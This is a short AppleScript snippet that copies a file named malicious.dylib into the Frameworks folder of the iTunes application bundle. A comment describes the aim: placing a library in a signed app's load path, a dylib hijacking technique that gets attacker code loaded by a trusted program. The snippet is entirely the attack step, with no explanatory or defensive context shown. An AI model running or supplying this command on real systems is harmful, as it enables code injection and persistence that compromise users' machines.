-- Copies dylib to signed app's load path
do shell script "cp ~/malicious.dylib /Applications/iTunes.app/Contents/Frameworks/"
